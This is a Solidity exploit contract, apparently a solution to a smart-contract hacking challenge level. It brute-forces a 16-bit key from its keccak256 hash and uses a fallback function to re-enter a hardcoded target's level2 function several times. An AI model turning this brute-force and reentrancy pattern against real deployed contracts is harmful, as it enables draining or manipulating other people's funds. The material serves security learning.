// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./Icontract.sol";

contract Attack2 {
    constructor() {
        
    // uint16 value = abi.decode(hex"913abd2fa66769e4601c20cd3bdea32afc207bfdd6b85faa2b3c5ee7e9317727", (uint16));
    }
    function getKey() public view returns (uint16) {
        bytes32 expectedHash = 0x913abd2fa66769e4601c20cd3bdea32afc207bfdd6b85faa2b3c5ee7e9317727;
        for (uint16 i = 0; i <= type(uint16).max; i++) {
            bytes32 hash = keccak256(abi.encode(i));
            if (hash == expectedHash) {
                return i;
            }
        }
        revert("key not found");
    }
         function exploit() public{
            // key = getKey();

            Icontract(0xb8D00Dd38607Da3C0096eEFCa4FA1CAAcc5eaB58).level2("superman");
    }

    fallback() external{
         Icontract(0xb8D00Dd38607Da3C0096eEFCa4FA1CAAcc5eaB58).level2("superman");
         Icontract(0xb8D00Dd38607Da3C0096eEFCa4FA1CAAcc5eaB58).level2("superman");
         Icontract(0xb8D00Dd38607Da3C0096eEFCa4FA1CAAcc5eaB58).level2("superman");
    }
}